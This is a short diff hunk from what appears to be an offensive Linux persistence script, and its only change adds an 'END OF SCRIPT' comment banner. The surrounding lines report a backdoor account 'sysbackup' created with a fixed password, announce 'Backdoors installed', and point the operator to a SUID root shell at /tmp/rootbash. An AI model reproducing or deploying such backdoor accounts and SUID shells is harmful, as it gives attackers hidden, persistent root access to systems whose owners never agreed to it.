@@ -138,6 +138,10 @@ echo "[+] user created -> sysbackup:Password123!"
 
 sleep 1
 
+################################
+#         END OF SCRIPT        # 
+################################
+
 echo "[+] Backdoors installed"
 sleep 1 
 echo "[!] -> /tmp/rootbash -p <- for suid backdoor"
